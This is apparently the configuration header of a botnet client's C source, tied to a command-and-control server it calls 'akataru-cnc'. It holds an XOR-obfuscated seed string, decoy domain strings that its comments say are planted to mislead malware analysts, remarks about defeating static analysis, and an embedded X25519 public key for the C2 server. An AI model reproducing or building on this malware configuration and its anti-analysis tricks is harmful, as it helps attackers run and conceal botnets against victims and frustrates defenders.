#ifndef CONFIG_H
#define CONFIG_H

/* String-table obfuscation key — derived at runtime via keysched.c.
 * No compile-time constants appear in the binary; each value is
 * computed through multi-step chains that defeat static analysis. */
/* OBFK_A..H are now returned by ks_get(0..7) — see keysched.h */

/* Fixed 12-byte ChaCha20 nonce used for all table entries.
 * Per-entry uniqueness comes from using the TABLE_* id as the block counter. */
#define TABLE_NONCE { 0x4B,0x41,0x54,0x41,0x52,0x55,0x00,0x00,0x00,0x00,0x00,0x00 }

/* Bot version (incremented on release) */
#ifndef BOT_VERSION
#define BOT_VERSION 1
#endif

#ifndef _INIT_VECTOR_SEED
#define _INIT_VECTOR_SEED "\x45\x50\x47\x43\x56\x55\x4b\x54\x47\x51\x44\x4d\x50\x4f\x47\x0c\x55\x4b\x44\x47\x4c\x47\x56\x0c\x4e\x4d\x4e"
#define _INIT_VECTOR_SEED_LEN 27
#endif
#ifndef _INIT_VECTOR_SEED_LEN
#define _INIT_VECTOR_SEED_LEN 27
#endif
/* Decoy domain-like byte sequences — plausible when XOR-decoded with
 * common single-byte keys (0x20, 0xFF, etc.). An analyst searching
 * for `.com`, `.net`, `.io` patterns will find multiple candidates.
 * None of these are used at runtime. */
#define DECOY_DOMAIN_1 "\x63\x6F\x6E\x74\x72\x6F\x6C\x2D\x73\x65\x72\x76\x65\x72\x2E\x63\x6F\x6D" /* XOR 0x00: control-server.com */
#define DECOY_DOMAIN_2 "\x43\x4E\x43\x2D\x55\x50\x44\x41\x54\x45\x2E\x4E\x45\x54"                   /* XOR 0x00: CNC-UPDATE.NET */
#define DECOY_DOMAIN_3 "\x72\x65\x6D\x6F\x74\x65\x2D\x61\x64\x6D\x69\x6E\x2E\x69\x6F"               /* XOR 0x00: remote-admin.io */
#define DECOY_DOMAIN_4 "\x53\x70\x47\x63\x72\x75\x4B\x74\x47\x51\x44\x6D\x70\x6F\x47\x2C\x75\x4B\x64\x67\x6C\x67\x76\x2C\x6E\x6D\x6E" /* XOR 0x20 bait */
#define DECOY_DOMAIN_5 "\xBA\xAF\xB8\xBC\xA9\xAA\xB4\xAB\xB8\xAE\xBB\xB2\xAF\xB0\xB8\xF3\xAA\xB4\xBB\xB8\xB3\xB8\xA9\xF3\xB1\xB2\xB1" /* XOR 0xFF bait */

/* Expected DJB2 hash of the decrypted real _INIT_VECTOR_SEED.
 * If the decrypted result doesn't match, a decoy is returned. */
#ifndef DOMAIN_HASH_EXPECTED
#define DOMAIN_HASH_EXPECTED 0x00000000U  /* 0 = skip verification (debug) */
#endif

#define DNS_0 8
#define DNS_1 8
#define DNS_2 8
#define DNS_3 8

/* CNC static public key (X25519) — embed at build time via -DCNC_STATIC_PUB_N=...
 * Derived from /var/lib/akataru-cnc/e2ee_priv.hex by build.sh. */
#ifndef CNC_STATIC_PUB_0
#define CNC_STATIC_PUB_0 0x64
#endif
#ifndef CNC_STATIC_PUB_1
#define CNC_STATIC_PUB_1 0x73
#endif
#ifndef CNC_STATIC_PUB_2
#define CNC_STATIC_PUB_2 0xf4
#endif
#ifndef CNC_STATIC_PUB_3
#define CNC_STATIC_PUB_3 0x99
#endif
#ifndef CNC_STATIC_PUB_4
#define CNC_STATIC_PUB_4 0x27
#endif
#ifndef CNC_STATIC_PUB_5
#define CNC_STATIC_PUB_5 0x6c
#endif
#ifndef CNC_STATIC_PUB_6
#define CNC_STATIC_PUB_6 0x49
#endif
#ifndef CNC_STATIC_PUB_7
#define CNC_STATIC_PUB_7 0x93
#endif
#ifndef CNC_STATIC_PUB_8
#define CNC_STATIC_PUB_8 0xe3
#endif
#ifndef CNC_STATIC_PUB_9
#define CNC_STATIC_PUB_9 0xb0
#endif
#ifndef CNC_STATIC_PUB_10
#define CNC_STATIC_PUB_10 0x89
#endif
#ifndef CNC_STATIC_PUB_11
#define CNC_STATIC_PUB_11 0x8c
#endif
#ifndef CNC_STATIC_PUB_12
#define CNC_STATIC_PUB_12 0x16
#endif
#ifndef CNC_STATIC_PUB_13
#define CNC_STATIC_PUB_13 0xcb
#endif
#ifndef CNC_STATIC_PUB_14
#define CNC_STATIC_PUB_14 0x8a
#endif
#ifndef CNC_STATIC_PUB_15
#define CNC_STATIC_PUB_15 0x53
#endif
#ifndef CNC_STATIC_PUB_16
#define CNC_STATIC_PUB_16 0x64
#endif
#ifndef CNC_STATIC_PUB_17
#define CNC_STATIC_PUB_17 0x07
#endif
#ifndef CNC_STATIC_PUB_18
#define CNC_STATIC_PUB_18 0xb5
#endif
#ifndef CNC_STATIC_PUB_19
#define CNC_STATIC_PUB_19 0xd6
#endif
#ifndef CNC_STATIC_PUB_20
#define CNC_STATIC_PUB_20 0xfd
#endif
#ifndef CNC_STATIC_PUB_21
#define CNC_STATIC_PUB_21 0x87
#endif
#ifndef CNC_STATIC_PUB_22
#define CNC_STATIC_PUB_22 0x1f
#endif
#ifndef CNC_STATIC_PUB_23
#define CNC_STATIC_PUB_23 0x09
#endif
#ifndef CNC_STATIC_PUB_24
#define CNC_STATIC_PUB_24 0xc4
#endif
#ifndef CNC_STATIC_PUB_25
#define CNC_STATIC_PUB_25 0xb7
#endif
#ifndef CNC_STATIC_PUB_26
#define CNC_STATIC_PUB_26 0xcc
#endif
#ifndef CNC_STATIC_PUB_27
#define CNC_STATIC_PUB_27 0x8d
#endif
#ifndef CNC_STATIC_PUB_28
#define CNC_STATIC_PUB_28 0x2c
#endif
#ifndef CNC_STATIC_PUB_29
#define CNC_STATIC_PUB_29 0xae
#endif
#ifndef CNC_STATIC_PUB_30
#define CNC_STATIC_PUB_30 0x56
#endif
#ifndef CNC_STATIC_PUB_31
#define CNC_STATIC_PUB_31 0x38
#endif

#define CNC_STATIC_PUB_INIT { CNC_STATIC_PUB_0, CNC_STATIC_PUB_1, CNC_STATIC_PUB_2, CNC_STATIC_PUB_3, CNC_STATIC_PUB_4, CNC_STATIC_PUB_5, CNC_STATIC_PUB_6, CNC_STATIC_PUB_7, CNC_STATIC_PUB_8, CNC_STATIC_PUB_9, CNC_STATIC_PUB_10, CNC_STATIC_PUB_11, CNC_STATIC_PUB_12, CNC_STATIC_PUB_13, CNC_STATIC_PUB_14, CNC_STATIC_PUB_15, CNC_STATIC_PUB_16, CNC_STATIC_PUB_17, CNC_STATIC_PUB_18, CNC_STATIC_PUB_19, CNC_STATIC_PUB_20, CNC_STATIC_PUB_21, CNC_STATIC_PUB_22, CNC_STATIC_PUB_23, CNC_STATIC_PUB_24, CNC_STATIC_PUB_25, CNC_STATIC_PUB_26, CNC_STATIC_PUB_27, CNC_STATIC_PUB_28, CNC_STATIC_PUB_29, CNC_STATIC_PUB_30, CNC_STATIC_PUB_31 }

/* MAC signing key — defaults to all-zeros (no signing enforcement).
 * Pass -DCNC_SIGNING_PUB_0..31 at build time to enable verification. */
#ifndef CNC_SIGNING_PUB_0
#define CNC_SIGNING_PUB_0 0x00
#endif
#ifndef CNC_SIGNING_PUB_1
#define CNC_SIGNING_PUB_1 0x00
#endif
#ifndef CNC_SIGNING_PUB_2
#define CNC_SIGNING_PUB_2 0x00
#endif
#ifndef CNC_SIGNING_PUB_3
#define CNC_SIGNING_PUB_3 0x00
#endif
#ifndef CNC_SIGNING_PUB_4
#define CNC_SIGNING_PUB_4 0x00
#endif
#ifndef CNC_SIGNING_PUB_5
#define CNC_SIGNING_PUB_5 0x00
#endif
#ifndef CNC_SIGNING_PUB_6
#define CNC_SIGNING_PUB_6 0x00
#endif
#ifndef CNC_SIGNING_PUB_7
#define CNC_SIGNING_PUB_7 0x00
#endif
#ifndef CNC_SIGNING_PUB_8
#define CNC_SIGNING_PUB_8 0x00
#endif
#ifndef CNC_SIGNING_PUB_9
#define CNC_SIGNING_PUB_9 0x00
#endif
#ifndef CNC_SIGNING_PUB_10
#define CNC_SIGNING_PUB_10 0x00
#endif
#ifndef CNC_SIGNING_PUB_11
#define CNC_SIGNING_PUB_11 0x00
#endif
#ifndef CNC_SIGNING_PUB_12
#define CNC_SIGNING_PUB_12 0x00
#endif
#ifndef CNC_SIGNING_PUB_13
#define CNC_SIGNING_PUB_13 0x00
#endif
#ifndef CNC_SIGNING_PUB_14
#define CNC_SIGNING_PUB_14 0x00
#endif
#ifndef CNC_SIGNING_PUB_15
#define CNC_SIGNING_PUB_15 0x00
#endif
#ifndef CNC_SIGNING_PUB_16
#define CNC_SIGNING_PUB_16 0x00
#endif
#ifndef CNC_SIGNING_PUB_17
#define CNC_SIGNING_PUB_17 0x00
#endif
#ifndef CNC_SIGNING_PUB_18
#define CNC_SIGNING_PUB_18 0x00
#endif
#ifndef CNC_SIGNING_PUB_19
#define CNC_SIGNING_PUB_19 0x00
#endif
#ifndef CNC_SIGNING_PUB_20
#define CNC_SIGNING_PUB_20 0x00
#endif
#ifndef CNC_SIGNING_PUB_21
#define CNC_SIGNING_PUB_21 0x00
#endif
#ifndef CNC_SIGNING_PUB_22
#define CNC_SIGNING_PUB_22 0x00
#endif
#ifndef CNC_SIGNING_PUB_23
#define CNC_SIGNING_PUB_23 0x00
#endif
#ifndef CNC_SIGNING_PUB_24
#define CNC_SIGNING_PUB_24 0x00
#endif
#ifndef CNC_SIGNING_PUB_25
#define CNC_SIGNING_PUB_25 0x00
#endif
#ifndef CNC_SIGNING_PUB_26
#define CNC_SIGNING_PUB_26 0x00
#endif
#ifndef CNC_SIGNING_PUB_27
#define CNC_SIGNING_PUB_27 0x00
#endif
#ifndef CNC_SIGNING_PUB_28
#define CNC_SIGNING_PUB_28 0x00
#endif
#ifndef CNC_SIGNING_PUB_29
#define CNC_SIGNING_PUB_29 0x00
#endif
#ifndef CNC_SIGNING_PUB_30
#define CNC_SIGNING_PUB_30 0x00
#endif
#ifndef CNC_SIGNING_PUB_31
#define CNC_SIGNING_PUB_31 0x00
#endif

#define CNC_SIGNING_PUB_INIT { CNC_SIGNING_PUB_0, CNC_SIGNING_PUB_1, CNC_SIGNING_PUB_2, CNC_SIGNING_PUB_3, CNC_SIGNING_PUB_4, CNC_SIGNING_PUB_5, CNC_SIGNING_PUB_6, CNC_SIGNING_PUB_7, CNC_SIGNING_PUB_8, CNC_SIGNING_PUB_9, CNC_SIGNING_PUB_10, CNC_SIGNING_PUB_11, CNC_SIGNING_PUB_12, CNC_SIGNING_PUB_13, CNC_SIGNING_PUB_14, CNC_SIGNING_PUB_15, CNC_SIGNING_PUB_16, CNC_SIGNING_PUB_17, CNC_SIGNING_PUB_18, CNC_SIGNING_PUB_19, CNC_SIGNING_PUB_20, CNC_SIGNING_PUB_21, CNC_SIGNING_PUB_22, CNC_SIGNING_PUB_23, CNC_SIGNING_PUB_24, CNC_SIGNING_PUB_25, CNC_SIGNING_PUB_26, CNC_SIGNING_PUB_27, CNC_SIGNING_PUB_28, CNC_SIGNING_PUB_29, CNC_SIGNING_PUB_30, CNC_SIGNING_PUB_31 }

#endif
